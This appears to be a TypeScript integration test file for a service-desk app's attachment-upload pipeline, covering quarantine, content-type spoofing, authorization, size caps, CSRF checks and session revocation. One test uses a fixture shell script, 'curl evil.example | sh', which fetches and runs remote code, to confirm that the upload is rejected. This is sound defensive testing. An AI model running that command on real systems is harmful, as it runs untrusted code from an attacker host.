import { promises as fs } from 'node:fs';
import request, { type Response, type Test } from 'supertest';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { createApp } from '../src/app';
import { PERMISSIONS, PLATFORM_ROLES } from '../src/helpers/permission-catalogue';
import { hashPassword } from '../src/helpers/crypto';
import { parseCookies } from '../src/helpers/cookies';
import {
  createCredential,
  createUser,
  disconnectDatabase,
  findRoleByKey,
  grantRoleToUser,
  prisma,
} from '../src/models';

/**
 * File attachments — integration tests (docs/19 §8, docs/37 §3).
 *
 * The assertions are docs/19 §8's own list, one per defect the pipeline exists to stop:
 *
 *   - an unscanned (PENDING) file is not retrievable;
 *   - a quarantined file is never served, even by a direct URL;
 *   - a content-type spoof (HTML in a `.pdf`) is rejected by sniffing;
 *   - an attachment is unreadable by someone without parent access;
 *   - a revoked session cannot download a previously accessible file;
 *   - the per-record cap holds;
 *   - downloads are audited.
 *
 * The pipeline's authorization claim is the one that matters most: there is no
 * attachment permission, so every path must resolve the parent and inherit its rule.
 */

const app = createApp();
const BASE = '/api/v1';

const OPERATOR_EMAIL = 'operator@attachments.test';
const OPERATOR_PASSWORD = 'Operator-Passphrase!23';
const ADMIN_EMAIL = 'admin@initech-files.test';
const ADMIN_PASSWORD = 'Secur3-Passphrase!';
const ALICE_EMAIL = 'alice@initech-files.test';
const ALICE_PASSWORD = 'V7kLm2-Qz9p!x';
const CAROL_EMAIL = 'carol@initech-files.test';
const CAROL_PASSWORD = 'H4qWn8-Zr2s!m';

/** A valid 1×1 PNG — allow-listed bytes for the happy path. */
const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
  'base64',
);

let databaseAvailable = false;

function dbIt(name: string, fn: () => Promise<void> | void): void {
  it(name, async (ctx) => {
    if (!databaseAvailable) {
      ctx.skip();
    }
    await fn();
  });
}

async function seedReferenceData(): Promise<void> {
  for (const permission of PERMISSIONS) {
    await prisma.permission.upsert({
      where: { key: permission.key },
      update: {
        resource: permission.resource,
        action: permission.action,
        description: permission.description,
      },
      create: permission,
    });
  }
  for (const role of PLATFORM_ROLES) {
    const existing = await prisma.role.findFirst({
      where: { organizationId: null, key: role.key },
    });
    const row = existing
      ? await prisma.role.update({
          where: { id: existing.id },
          data: { name: role.name, description: role.description, isSystem: true },
        })
      : await prisma.role.create({
          data: {
            organizationId: null,
            key: role.key,
            name: role.name,
            description: role.description,
            isSystem: true,
          },
        });
    for (const key of role.permissions) {
      const permission = await prisma.permission.findUniqueOrThrow({ where: { key } });
      await prisma.rolePermission.upsert({
        where: { roleId_permissionId: { roleId: row.id, permissionId: permission.id } },
        update: {},
        create: { roleId: row.id, permissionId: permission.id },
      });
    }
  }
}

async function resetDatabase(): Promise<void> {
  await prisma.$executeRawUnsafe(
    `TRUNCATE TABLE
       attachments,
       webhook_deliveries, webhook_subscriptions, webhook_fanout_states,
       report_exports, notification_preferences, notifications, tasks, incidents,
       request_field_values, service_requests, comments,
       reference_sequences, catalog_item_fields, catalog_items, categories, sla_targets,
       sla_policies, business_calendars, sla_clocks,
       sessions, password_reset_tokens, invitations, user_roles, role_permissions,
       teams, team_members, audit_logs, outbox, job_records, credentials, users,
       roles, permissions, organizations
     RESTART IDENTITY CASCADE`,
  );
  await seedReferenceData();
}

function sessionFrom(response: Response): { cookie: string; csrf: string } {
  const raw = response.headers['set-cookie'];
  const joined = Array.isArray(raw) ? raw.join('; ') : String(raw ?? '');
  const cookies = parseCookies(joined);
  return {
    cookie: `servicehub_session=${cookies['servicehub_session'] ?? ''}; servicehub_csrf=${cookies['servicehub_csrf'] ?? ''}`,
    csrf: cookies['servicehub_csrf'] ?? '',
  };
}

function login(email: string, password: string): Test {
  return request(app).post(`${BASE}/auth/login`).send({ email, password });
}

interface UploadOptions {
  entityType?: string;
  entityId: string;
  buffer: Buffer;
  filename: string;
  contentType?: string;
}

function upload(session: { cookie: string; csrf: string }, options: UploadOptions): Test {
  const req = request(app)
    .post(`${BASE}/attachments`)
    .set('cookie', session.cookie)
    .set('x-csrf-token', session.csrf)
    .field('entityType', options.entityType ?? 'ServiceRequest')
    .field('entityId', options.entityId)
    .attach('file', options.buffer, {
      filename: options.filename,
      ...(options.contentType ? { contentType: options.contentType } : {}),
    });
  return req;
}

describe('File attachments', () => {
  let operator: { cookie: string; csrf: string };
  let admin: { cookie: string; csrf: string };
  let alice: { cookie: string; csrf: string };
  let carol: { cookie: string; csrf: string };
  let organizationId = '';
  let itemId = '';
  let aliceRequestId = '';
  let carolRequestId = '';

  beforeAll(async () => {
    try {
      await prisma.permission.count();
      databaseAvailable = true;
    } catch {
      databaseAvailable = false;
      return;
    }

    await resetDatabase();

    const superAdminRole = await findRoleByKey('SUPER_ADMIN', null);
    if (!superAdminRole) throw new Error('SUPER_ADMIN role was not seeded.');

    const operatorUser = await createUser({
      email: OPERATOR_EMAIL,
      displayName: 'Platform Operator',
      organizationId: null,
      status: 'ACTIVE',
    });
    await createCredential({
      userId: operatorUser.id,
      passwordHash: await hashPassword(OPERATOR_PASSWORD),
    });
    await grantRoleToUser({
      userId: operatorUser.id,
      roleId: superAdminRole.id,
      organizationId: null,
    });
  });

  afterAll(async () => {
    // Uploaded bytes are test fixtures, not state the next run should inherit.
    await fs
      .rm(process.env.FILE_STORAGE_DIR ?? './.storage-test', {
        recursive: true,
        force: true,
      })
      .catch(() => undefined);
    await disconnectDatabase().catch(() => undefined);
  });

  async function onboard(
    email: string,
    password: string,
    roleKey: string,
    displayName: string,
  ): Promise<{ cookie: string; csrf: string }> {
    const roles = await request(app).get(`${BASE}/roles`).set('cookie', admin.cookie);
    const role = (roles.body.items as Array<{ id: string; key: string }>).find(
      (r) => r.key === roleKey,
    );
    const invited = await request(app)
      .post(`${BASE}/users`)
      .set('cookie', admin.cookie)
      .set('x-csrf-token', admin.csrf)
      .send({ email, roleId: role?.id, displayName });
    await request(app)
      .post(`${BASE}/auth/accept-invitation`)
      .send({ token: invited.body.invitation.token, password })
      .expect(204);
    return sessionFrom(await login(email, password));
  }

  dbIt('sets up a tenant, a catalog item and two requesters', async () => {
    operator = sessionFrom(await login(OPERATOR_EMAIL, OPERATOR_PASSWORD));
    const provisioned = await request(app)
      .post(`${BASE}/platform/organizations`)
      .set('cookie', operator.cookie)
      .set('x-csrf-token', operator.csrf)
      .send({
        name: 'Initech Files',
        administratorEmail: ADMIN_EMAIL,
        administratorName: 'Initech Admin',
        defaultTimeZone: 'Europe/London',
      });
    organizationId = provisioned.body.organization.id;
    await request(app)
      .post(`${BASE}/auth/accept-invitation`)
      .send({ token: provisioned.body.invitation.token, password: ADMIN_PASSWORD })
      .expect(204);
    admin = sessionFrom(await login(ADMIN_EMAIL, ADMIN_PASSWORD));

    alice = await onboard(ALICE_EMAIL, ALICE_PASSWORD, 'REQUESTER', 'Alice Requester');
    carol = await onboard(CAROL_EMAIL, CAROL_PASSWORD, 'REQUESTER', 'Carol Requester');

    const policies = await request(app).get(`${BASE}/sla/policies`).set('cookie', admin.cookie);
    const policyId = (policies.body.items as Array<{ id: string; isDefault: boolean }>).find(
      (p) => p.isDefault,
    )?.id;
    const team = await prisma.team.create({ data: { organizationId, name: 'Service Desk' } });
    const category = await request(app)
      .post(`${BASE}/catalog/categories`)
      .set('cookie', admin.cookie)
      .set('x-csrf-token', admin.csrf)
      .send({ name: 'Access' });
    const item = await request(app)
      .post(`${BASE}/catalog/items`)
      .set('cookie', admin.cookie)
      .set('x-csrf-token', admin.csrf)
      .send({
        categoryId: category.body.category.id,
        name: 'Laptop Request',
        defaultPriority: 'MEDIUM',
        defaultSlaPolicyId: policyId,
        fulfilmentTeamId: team.id,
        fields: [],
      });
    itemId = item.body.item.id;
    await request(app)
      .post(`${BASE}/catalog/items/${itemId}/activate`)
      .set('cookie', admin.cookie)
      .set('x-csrf-token', admin.csrf)
      .expect(200);

    const aliceRequest = await request(app)
      .post(`${BASE}/requests`)
      .set('cookie', alice.cookie)
      .set('x-csrf-token', alice.csrf)
      .send({ catalogItemId: itemId, title: 'Alice laptop', fields: {} })
      .expect(201);
    aliceRequestId = aliceRequest.body.request.id;

    const carolRequest = await request(app)
      .post(`${BASE}/requests`)
      .set('cookie', carol.cookie)
      .set('x-csrf-token', carol.csrf)
      .send({ catalogItemId: itemId, title: 'Carol laptop', fields: {} })
      .expect(201);
    carolRequestId = carolRequest.body.request.id;
  });

  dbIt('uploads, lists and downloads with the documented headers and an audit trail', async () => {
    const created = await upload(alice, {
      entityId: aliceRequestId,
      buffer: PNG,
      filename: 'screen.png',
      contentType: 'image/png',
    }).expect(201);

    const attachment = created.body.attachment as { id: string; status: string; sizeBytes: number };
    expect(attachment.status).toBe('AVAILABLE');
    expect(attachment.sizeBytes).toBe(PNG.length);
    expect(created.headers.location).toBe(`/api/v1/attachments/${attachment.id}/content`);

    // The client filename never becomes the storage key (docs/19 §7.2 rule 3).
    const row = await prisma.attachment.findUniqueOrThrow({ where: { id: attachment.id } });
    expect(row.storageKey).not.toContain('screen.png');
    expect(row.storageKey.startsWith(organizationId)).toBe(true);

    const list = await request(app)
      .get(`${BASE}/attachments?entityType=ServiceRequest&entityId=${aliceRequestId}`)
      .set('cookie', alice.cookie)
      .expect(200);
    expect(list.body.items as Array<{ id: string }>).toHaveLength(1);
    expect(list.body.items[0].id).toBe(attachment.id);

    const download = await request(app)
      .get(`/api/v1/attachments/${attachment.id}/content`)
      .set('cookie', alice.cookie)
      .expect(200);
    expect(download.headers['x-content-type-options']).toBe('nosniff');
    expect(download.headers['cache-control']).toContain('no-store');
    expect(download.headers['content-type']).toContain('image/png');
    expect(download.headers['content-disposition']).toContain('inline;');
    expect(Buffer.from(download.body).equals(PNG)).toBe(true);

    // Both mutations are auditable (docs/19 §7.2 step 9, §7.3).
    const uploaded = await prisma.auditLog.findFirst({
      where: { action: 'attachment.upload', entityId: attachment.id },
    });
    expect(uploaded).not.toBeNull();
    const downloaded = await prisma.auditLog.findFirst({
      where: { action: 'attachment.download', entityId: attachment.id },
    });
    expect(downloaded).not.toBeNull();
  });

  dbIt('serves a non-image as octet-stream with an attachment disposition', async () => {
    const created = await upload(alice, {
      entityId: aliceRequestId,
      buffer: Buffer.from('Password rotation note for the migration window.\n'),
      filename: 'notes.txt',
      contentType: 'text/plain',
    }).expect(201);

    const download = await request(app)
      .get(`/api/v1/attachments/${created.body.attachment.id}/content`)
      .set('cookie', alice.cookie)
      .expect(200);
    // Never a renderable type in a tab (docs/19 §7.3).
    expect(download.headers['content-type']).toContain('application/octet-stream');
    expect(download.headers['content-disposition']).toContain('attachment;');
    expect(download.headers['x-content-type-options']).toBe('nosniff');
  });

  dbIt('rejects a content-type spoof and never serves the quarantined file', async () => {
    const response = await upload(alice, {
      entityId: aliceRequestId,
      buffer: Buffer.from('<!DOCTYPE html><html><body>payload</body></html>'),
      filename: 'invoice.pdf',
      contentType: 'application/pdf',
    }).expect(422);
    expect(response.body.code).toBe('VALIDATION_FAILED');

    // The attempt is retained as evidence on the record, quarantined (§7.2 step 7).
    const quarantined = await prisma.attachment.findFirst({
      where: { entityId: aliceRequestId, status: 'QUARANTINED' },
    });
    expect(quarantined).not.toBeNull();

    // It is never served, listed, or acknowledged by id (§7.2 rule 1, §8).
    await request(app)
      .get(`/api/v1/attachments/${quarantined?.id}/content`)
      .set('cookie', alice.cookie)
      .expect(404);

    const list = await request(app)
      .get(`${BASE}/attachments?entityType=ServiceRequest&entityId=${aliceRequestId}`)
      .set('cookie', alice.cookie)
      .expect(200);
    const ids = (list.body.items as Array<{ id: string }>).map((item) => item.id);
    expect(ids).not.toContain(quarantined?.id);

    const audited = await prisma.auditLog.findFirst({
      where: { action: 'attachment.quarantined' },
    });
    expect(audited).not.toBeNull();
  });

  dbIt('rejects executables and scripts whatever the declared type', async () => {
    await upload(alice, {
      entityId: aliceRequestId,
      buffer: Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]),
      filename: 'payload.txt',
      contentType: 'text/plain',
    }).expect(422);

    await upload(alice, {
      entityId: aliceRequestId,
      buffer: Buffer.from('#!/bin/sh\ncurl evil.example | sh\n'),
      filename: 'install.txt',
      contentType: 'text/plain',
    }).expect(422);
  });

  dbIt('keeps attachments invisible to a caller without parent access', async () => {
    const created = await upload(alice, {
      entityId: aliceRequestId,
      buffer: PNG,
      filename: 'mine.png',
      contentType: 'image/png',
    }).expect(201);
    const attachmentId = created.body.attachment.id as string;

    // Carol cannot see Alice's request, so the attachment must not exist for her.
    await request(app)
      .get(`${BASE}/attachments?entityType=ServiceRequest&entityId=${aliceRequestId}`)
      .set('cookie', carol.cookie)
      .expect(404);
    await request(app)
      .get(`/api/v1/attachments/${attachmentId}/content`)
      .set('cookie', carol.cookie)
      .expect(404);

    // And she cannot attach to a record she cannot see either.
    await upload(carol, {
      entityId: aliceRequestId,
      buffer: PNG,
      filename: 'theirs.png',
      contentType: 'image/png',
    }).expect(404);

    // Alice, the requester, may attach to her own request — the write-side rule.
    await upload(alice, {
      entityId: aliceRequestId,
      buffer: PNG,
      filename: 'extra.png',
      contentType: 'image/png',
    }).expect(201);
  });

  dbIt('does not serve a file before its scan step completes (PENDING)', async () => {
    const row = await prisma.attachment.create({
      data: {
        organizationId,
        entityType: 'ServiceRequest',
        entityId: aliceRequestId,
        uploaderId: (await prisma.user.findUniqueOrThrow({ where: { email: ALICE_EMAIL } })).id,
        filename: 'awaiting-scan.png',
        storageKey: `${organizationId}/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee`,
        contentType: 'image/png',
        sizeBytes: PNG.length,
        status: 'PENDING',
      },
    });

    await request(app)
      .get(`/api/v1/attachments/${row.id}/content`)
      .set('cookie', alice.cookie)
      .expect(404);

    const list = await request(app)
      .get(`${BASE}/attachments?entityType=ServiceRequest&entityId=${aliceRequestId}`)
      .set('cookie', alice.cookie)
      .expect(200);
    const ids = (list.body.items as Array<{ id: string }>).map((item) => item.id);
    expect(ids).not.toContain(row.id);

    await prisma.attachment.delete({ where: { id: row.id } });
  });

  dbIt('enforces the per-record attachment cap', async () => {
    const uploaderId = (await prisma.user.findUniqueOrThrow({ where: { email: ALICE_EMAIL } })).id;
    // The service counts every row on the record — a quarantined attempt is retained
    // evidence, so it occupies the cap too (docs/19 §7.4).
    const current = await prisma.attachment.count({ where: { entityId: aliceRequestId } });

    // Fill the record to the cap (docs/19 §7.4: 20) with rows rather than 20 round trips.
    const filler = [];
    for (let i = current; i < 20; i += 1) {
      filler.push({
        organizationId,
        entityType: 'ServiceRequest',
        entityId: aliceRequestId,
        uploaderId,
        filename: `filler-${i}.png`,
        storageKey: `${organizationId}/filler-${i}-${Date.now()}`,
        contentType: 'image/png',
        sizeBytes: PNG.length,
        status: 'AVAILABLE' as const,
      });
    }
    if (filler.length > 0) await prisma.attachment.createMany({ data: filler });

    const over = await upload(alice, {
      entityId: aliceRequestId,
      buffer: PNG,
      filename: 'one-too-many.png',
      contentType: 'image/png',
    }).expect(409);
    expect(over.body.code).toBe('CONFLICT');
  });

  dbIt('requires authentication and a CSRF token', async () => {
    await request(app)
      .get(`${BASE}/attachments?entityType=ServiceRequest&entityId=${aliceRequestId}`)
      .expect(401);
    await request(app)
      .post(`${BASE}/attachments`)
      .field('entityType', 'ServiceRequest')
      .field('entityId', aliceRequestId)
      .attach('file', PNG, 'x.png')
      .expect(401);

    // Authenticated but no CSRF header: the state change must fail closed.
    await request(app)
      .post(`${BASE}/attachments`)
      .set('cookie', alice.cookie)
      .field('entityType', 'ServiceRequest')
      .field('entityId', aliceRequestId)
      .attach('file', PNG, 'x.png')
      .expect(403);
  });

  dbIt('refuses an upload larger than the per-file cap', async () => {
    // 10 MB + 1: past `FILE_MAX_BYTES` (docs/19 §7.4), rejected with the documented code.
    const oversized = Buffer.alloc(10 * 1024 * 1024 + 1, 0x41);
    const response = await upload(alice, {
      entityId: aliceRequestId,
      buffer: oversized,
      filename: 'huge.bin',
      contentType: 'application/octet-stream',
    });
    expect(response.status).toBe(413);
    expect(response.body.code).toBe('PAYLOAD_TOO_LARGE');
  });

  dbIt('refuses a download once the caller’s session is revoked', async () => {
    const created = await upload(carol, {
      entityId: carolRequestId,
      buffer: PNG,
      filename: 'carol.png',
      contentType: 'image/png',
    }).expect(201);
    const attachmentId = created.body.attachment.id as string;

    // Access is re-checked at download time (docs/19 §7.3) — the upload-time grant is
    // never baked into the file.
    await request(app)
      .get(`/api/v1/attachments/${attachmentId}/content`)
      .set('cookie', carol.cookie)
      .expect(200);

    await prisma.session.updateMany({
      where: { revokedAt: null },
      data: { revokedAt: new Date() },
    });

    await request(app)
      .get(`/api/v1/attachments/${attachmentId}/content`)
      .set('cookie', carol.cookie)
      .expect(401);
  });
});
